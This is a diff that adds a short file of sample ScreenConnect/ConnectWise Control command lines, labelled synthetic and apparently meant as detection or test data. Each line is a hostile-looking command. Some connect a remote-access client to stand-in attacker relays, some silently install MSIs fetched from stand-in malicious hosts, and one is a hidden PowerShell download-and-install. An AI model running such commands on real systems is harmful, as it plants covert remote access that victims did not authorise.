@@ -1,0 +1,8 @@
+# Sample ScreenConnect / Control command lines (synthetic / sanitized)
+# One observation per line
+
+ScreenConnect.Client.exe "?e=Access&y=Guest&h=relay-evil.example.com&p=443&k=AAAA&s=deadbeef&i=cafe"
+"C:\Windows\Temp\ScreenConnect.ClientSetup.msi" /quiet
+msiexec /i "https://copy-of-vm-2022.badactor.example/Bin/ScreenConnect.ClientSetup.msi" /qn
+ConnectWiseControl.Client.exe h=onprem.scam-panel.example p=8040 e=Support
+powershell -nop -w hidden -c "Start-Process msiexec -ArgumentList '/i https://gaza.rovider.example/Bin/client.msi /qn'"
